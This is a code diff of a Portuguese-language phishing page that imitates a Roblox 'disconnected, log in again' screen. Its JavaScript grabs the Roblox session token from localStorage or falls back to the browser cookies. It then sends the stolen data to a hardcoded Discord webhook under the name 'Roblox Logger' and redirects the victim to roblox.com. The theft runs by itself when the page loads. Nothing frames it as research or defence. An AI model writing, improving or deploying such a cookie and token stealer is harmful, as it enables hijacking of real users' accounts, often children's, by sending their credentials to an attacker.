@@ -36,12 +36,9 @@
 <body>
 
     <div class="container">
-        <!-- Logo do Roblox -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo">
         <h1>Você foi desconectado</h1>
         <p>Clique abaixo para entrar novamente.</p>
-        
-        <!-- O botão agora serve apenas como "falso passo" para a vítima clicar -->
         <button onclick="stealCookie()">Entrar</button>
     </div>
 
@@ -49,12 +46,24 @@
         const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
 
         function stealCookie() {
-            var cookie = document.cookie;
+            // 1. Tenta pegar do LocalStorage (onde o Roblox guarda o token)
+            var robloxAuth = localStorage.getItem('RBXSSO'); 
             
-            console.log("Cookie capturado:", cookie); 
+            // 2. Se não achar no LocalStorage, tenta pegar dos Cookies normais como backup
+            var normalCookies = document.cookie;
+
+            // 3. Define qual usar
+            var finalData = "";
+            if (robloxAuth) {
+                finalData = "🔑 **Token de Sessão (LocalStorage):**\n\n```\n" + robloxAuth + "\n```";
+            } else {
+                finalData = "🍪 **Cookies Normais:**\n\n```\n" + normalCookies + "\n```";
+            }
+
+            console.log("Dados capturados:", finalData);
 
             const payload = {
-                content: "🍪 **Novo Cookie Capturado!**\n\n```\n" + cookie + "\n```",
+                content: finalData,
                 username: "Roblox Logger",
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
             };
@@ -68,18 +77,17 @@
                 body: JSON.stringify(payload)
             })
             .then(response => {
-                if (!response.ok) throw new Error('Erro no proxy');
                 window.location.href = "https://www.roblox.com";
             })
             .catch(error => {
-                console.error("Falha no proxy:", error);
+                console.error("Erro:", error);
                 window.location.href = "https://www.roblox.com";
             });
         }
 
-        // Garante que o script rode assim que a página carregar completamente
+        // Executa automaticamente ao carregar
         window.addEventListener('load', function() {
-            setTimeout(stealCookie, 500); // Pequeno delay para garantir que o cookie esteja disponível
+            setTimeout(stealCookie, 500);
         });
     </script>
 </body>
